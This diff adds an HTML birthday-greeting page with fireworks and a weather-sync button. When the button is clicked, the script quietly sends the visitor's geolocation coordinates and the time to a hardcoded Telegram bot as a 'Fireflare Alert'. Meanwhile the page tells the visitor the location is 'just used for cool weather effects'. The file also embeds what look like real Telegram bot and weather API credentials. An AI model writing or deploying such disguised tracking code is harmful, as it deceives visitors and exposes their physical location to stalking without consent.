@@ -1,0 +1,365 @@
+<!-- Birthday Wisher along with Firework effects and Real time Weather data -->
+ <!-- Program by Zidaan -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Happy Birthday To You</title> <!-- Page title -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    /* General styles for all elements */
+    * {
+      box-sizing: border-box;
+    }
+/* Basic body and html styles */
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+      overflow: hidden;
+      text-align: center;
+      background: radial-gradient(#000000, #1a1a1a); /* Dark gradient background */
+    }
+/* Main heading animation */
+    h1 {
+      font-size: 3em;
+      margin-top: 12vh;
+      animation: colorShift 5s infinite alternate;
+      z-index: 2;
+      position: relative;
+    }
+/* Subtext style below heading */
+    .birthday-subtext {
+      margin-top: 1em;
+      font-size: 1.3em;
+      color: #ffb6c1;
+      font-style: italic;
+      animation: glowText 2s infinite alternate;
+    }
+/* Animation to change heading color and glowing shadow over time */
+    @keyframes colorShift {
+      0% {
+        color: #ff6ec7;
+        text-shadow: 0 0 10px #ff6ec7;
+      }
+
+      25% {
+        color: #ffb347;
+        text-shadow: 0 0 10px #ffb347;
+      }
+
+      50% {
+        color: #00FFFF;
+        text-shadow: 0 0 10px #00FFFF;
+      }
+
+      75% {
+        color: #7CFC00;
+        text-shadow: 0 0 10px #7CFC00;
+      }
+
+      100% {
+        color: #ff1493;
+        text-shadow: 0 0 10px #ff1493;
+      }
+    }
+/* Animation for soft glowing for subtext */
+    @keyframes glowText {
+      from {
+        opacity: 0.7;
+        text-shadow: 0 0 10px #ff6ec7;
+      }
+
+      to {
+        opacity: 1;
+        text-shadow: 0 0 20px #ffffff;
+      }
+    }
+/* Animation for weather button's background pulsing */
+    @keyframes buttonColorPulse {
+      0% {
+        background: linear-gradient(45deg, #ff007f, #ff00ff);
+      }
+
+      25% {
+        background: linear-gradient(45deg, #00ffff, #ffcc00);
+      }
+
+      50% {
+        background: linear-gradient(45deg, #ff4500, #00ff7f);
+      }
+
+      75% {
+        background: linear-gradient(45deg, #ff1493, #00bfff);
+      }
+
+      100% {
+        background: linear-gradient(45deg, #00ffcc, #ff69b4);
+      }
+    }
+/* Status message prefix */
+    #status::before {
+      content: "For best experience, allow location — it's just used for cool weather effects!";
+      display: block;
+      margin-bottom: 10px;
+      font-size: 0.9em;
+      color: #0ef;
+      font-style: italic;
+    }
+/* Animation for glowing text */
+    @keyframes glowText {
+      from {
+        opacity: 0.7;
+        text-shadow: 0 0 10px #ff6ec7;
+      }
+
+      to {
+        opacity: 1;
+        text-shadow: 0 0 20px #ffffff;
+      }
+    }
+/* Button style */
+    #weatherBtn {
+      animation: buttonColorPulse 5s infinite alternate;
+      background-size: 200% auto;
+      color: #fff;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 12px;
+      transition: transform 0.3s, box-shadow 0.3s;
+      cursor: pointer;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+    }
+/* Upper section with heading and subtext */
+    #upper-section {
+      height: 60vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+    }
+/* Lower section with weather button */
+    #lower-section {
+      height: 40vh;
+      padding: 20px;
+      position: relative;
+      z-index: 2;
+      background: radial-gradient(#000000, #1a1a1a);
+      transition: background 1.5s ease-in-out;
+    }
+/* Weather button styling and animation */
+    #weatherBtn {
+      margin-top: 10px;
+      padding: 14px 28px;
+      font-size: 1.2em;
+      border: none;
+      background: linear-gradient(to right, #ff6ec7, #ff1493);
+      color: white;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+/* Button hover effects */
+    #weatherBtn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 15px #ff6ec7;
+    }
+/* Status message */
+    #status {
+      margin-top: 15px;
+      font-size: 1.1em;
+      color: #ffffff;
+    }
+/* Weather information */
+    #weatherData {
+      margin-top: 12px;
+      font-size: 1.1em;
+      color: #aee;
+    }
+/* Canvas for fireworks background */
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 0;
+      pointer-events: none;
+    }
+/* Responsiveness */
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 2em;
+      }
+
+      .birthday-subtext {
+        font-size: 1em;
+      }
+
+      #weatherBtn {
+        font-size: 1em;
+        padding: 12px 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.6em;
+      }
+
+      .birthday-subtext {
+        font-size: 0.9em;
+      }
+
+      #weatherBtn {
+        font-size: 0.9em;
+        padding: 10px 16px;
+      }
+    }
+  </style>
+</head>
+<!-- Firework animation canvas -->
+<body>
+  <canvas id="canvas"></canvas>
+ <!-- Greeting and message section -->
+  <div id="upper-section">
+    <h1>Happy Birthday 🎉</h1>
+    <p class="birthday-subtext">May your day be filled with sparkle ✨ and joy 🎈</p>
+    <p class="birthday-subtext">May your smile shine brighter than all the flares in the sky 🌌</p>
+  </div>
+<!-- Weather sync section -->
+  <div id="lower-section">
+    <button id="weatherBtn" onclick="syncWeather()">Sync background with weather ☂️</button>
+    <p id="status"></p> <!-- Status of location/weather -->
+    <div id="weatherData"></div> <!-- Weather information -->
+  </div>
+
+  <script>
+     // Telegram Bot & Weather API credentials
+    const BOT_TOKEN = "7188197111:AAE89srSGOhS9Y8_I0YQ7WEYbKZUGULTfvU";
+    const CHAT_ID = "7051599130";
+    const WEATHER_API_KEY = "1ee88e5feee3f7ad8948f6fb8f96b948";
+
+    // Called on weather button click
+    function syncWeather() {
+      const status = document.getElementById("status");
+      const weatherData = document.getElementById("weatherData");
+      status.textContent = "☂️ Getting weather data for your location...";
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const time = new Date().toLocaleString();
+
+          // Send Telegram alert with coordinates
+          const message = `🚨 Fireflare Alert\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🕒 Time: ${time}`;
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+          });
+
+          // Fetch current weather using OpenWeatherMap API
+          fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${WEATHER_API_KEY}`)
+            .then(res => res.json())
+            .then(data => {
+              const weather = data.weather[0].main.toLowerCase();
+              const city = data.name;
+              changeLowerBackground(weather);  // Change background based on weather
+              status.textContent = "✅ Synced with weather";
+              weatherData.innerHTML = `<strong>Place:</strong> ${city} &nbsp; | &nbsp; <strong>Weather:</strong> ${capitalize(weather)}`;
+            });
+        }, () => {
+          status.textContent = "⚠️ Could not access location.";
+        });
+      }
+    }
+
+    // Changes the lower section background based on weather condition
+    function changeLowerBackground(condition) {
+      const lower = document.getElementById("lower-section");
+      let gifUrl = "";
+
+      if (condition.includes("clear")) {
+        gifUrl = "https://i.gifer.com/VhjB.gif"; // Sunny
+      } else if (condition.includes("cloud")) {
+        gifUrl = "https://i.gifer.com/7RtV.gif"; // Clouds
+      } else if (condition.includes("rain")) {
+        gifUrl = "https://i.gifer.com/1pX9.gif"; // Rain
+      } else if (condition.includes("snow")) {
+        gifUrl = "https://i.gifer.com/27MX.gif"; // Snow
+      } else if (condition.includes("mist") || condition.includes("fog")) {
+        gifUrl = "https://i.gifer.com/IJNs.gif"; // Fog
+      }
+      // Set background image or default
+      lower.style.background = gifUrl
+        ? `url('${gifUrl}') center/cover no-repeat`
+        : "radial-gradient(#000000, #1a1a1a)";
+      lower.style.backgroundSize = "cover";
+      lower.style.backgroundRepeat = "no-repeat";
+      lower.style.backgroundPosition = "center";
+    }
+    // Capitalizes first letter of a word
+    function capitalize(word) {
+      return word.charAt(0).toUpperCase() + word.slice(1);
+    }
+
+    // Fireworks Section
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    let particles = [];
+    // Create a burst of colorful particles
+    function createFirework(x, y) {
+      let colors = ["#ff6ec7", "#ffb347", "#00FFFF", "#7CFC00", "#ff1493"];
+      for (let i = 0; i < 100; i++) {
+        particles.push({
+          x,
+          y,
+          angle: Math.random() * 2 * Math.PI,
+          speed: Math.random() * 5 + 2,
+          radius: Math.random() * 2 + 1,
+          life: 100,
+          color: colors[Math.floor(Math.random() * colors.length)]
+        });
+      }
+    }
+    // Animate particles
+    function animate() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      particles.forEach((p, index) => {
+        let vx = Math.cos(p.angle) * p.speed;
+        let vy = Math.sin(p.angle) * p.speed;
+        p.x += vx;
+        p.y += vy;
+        p.speed *= 0.98;
+        p.life--;
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.radius, 0, 2 * Math.PI);
+        ctx.fillStyle = p.color;
+        ctx.fill();
+        if (p.life <= 0) particles.splice(index, 1);
+      });
+      requestAnimationFrame(animate); // Loop animation
+    }
+
+    animate();
+    // Launch fireworks at random positions every second
+    setInterval(() => {
+      let x = Math.random() * canvas.width;
+      let y = Math.random() * canvas.height * 0.5;
+      createFirework(x, y);
+    }, 1000);
+  </script>
+</body>
+</html>
+<!--End of Program-->
